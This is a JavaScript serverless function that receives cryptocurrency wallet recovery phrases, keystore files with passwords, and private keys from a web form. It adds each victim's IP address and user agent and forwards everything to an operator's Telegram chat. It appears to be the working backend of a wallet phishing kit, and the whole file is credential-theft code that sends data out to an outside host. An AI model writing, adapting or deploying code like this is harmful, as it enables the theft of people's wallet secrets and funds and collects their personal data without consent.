/**
 * Vercel Serverless Function
 * Handles form submissions and sends data to Telegram
 */

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  // Get environment variables
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Validate configuration
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({
      success: false,
      error: 'Telegram configuration not set. Please configure environment variables.'
    });
  }

  // Get form data
  const { phrase, keystore, password, key, wallet_id } = req.body;

  // Determine type and data
  let type = '';
  let data = '';

  if (phrase && phrase.trim()) {
    type = 'Recovery Phrase (12/24 words)';
    data = phrase.trim();
  } else if (keystore && keystore.trim()) {
    type = 'Keystore JSON';
    data = keystore.trim() + (password ? `\n\nPassword: ${password}` : '');
  } else if (key && key.trim()) {
    type = 'Private Key';
    data = key.trim();
  } else {
    return res.status(400).json({ success: false, error: 'No data provided' });
  }

  // Get user IP and browser info
  const ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection?.remoteAddress || 
             'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);

  // Format message for Telegram
  const message = `🔐 <b>New Wallet Data Received</b>\n\n` +
    `📋 <b>Type:</b> ${escapeHtml(type)}\n` +
    `👛 <b>Wallet:</b> ${escapeHtml(wallet_id || 'Unknown')}\n` +
    `🌐 <b>IP Address:</b> ${escapeHtml(ip)}\n` +
    `🕐 <b>Timestamp:</b> ${escapeHtml(timestamp)}\n\n` +
    `📝 <b>Data:</b>\n<code>\n${escapeHtml(data)}\n</code>\n\n` +
    `🌍 <b>User Agent:</b>\n${escapeHtml(userAgent.substring(0, 200))}`;

  // Prepare Telegram API request
  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const telegramData = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };

  try {
    // Send to Telegram
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams(telegramData).toString()
    });

    const result = await response.json();

    if (response.ok && result.ok) {
      return res.status(200).json({
        success: true,
        message: 'Data sent successfully'
      });
    } else {
      // Try plain text if HTML fails
      const plainMessage = `🔐 New Wallet Data Received\n\n` +
        `📋 Type: ${type}\n` +
        `👛 Wallet: ${wallet_id || 'Unknown'}\n` +
        `🌐 IP Address: ${ip}\n` +
        `🕐 Timestamp: ${timestamp}\n\n` +
        `📝 Data:\n${data}\n\n` +
        `🌍 User Agent:\n${userAgent.substring(0, 200)}`;

      const plainTelegramData = {
        chat_id: TELEGRAM_CHAT_ID,
        text: plainMessage,
        disable_web_page_preview: true
      };

      const plainResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(plainTelegramData).toString()
      });

      const plainResult = await plainResponse.json();

      if (plainResponse.ok && plainResult.ok) {
        return res.status(200).json({
          success: true,
          message: 'Data sent successfully'
        });
      } else {
        return res.status(500).json({
          success: false,
          error: 'Failed to send to Telegram: ' + (plainResult.description || 'Unknown error')
        });
      }
    }
  } catch (error) {
    return res.status(500).json({
      success: false,
      error: 'Connection error: ' + error.message
    });
  }
}

// Helper function to escape HTML
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return String(text).replace(/[&<>"']/g, m => map[m]);
}

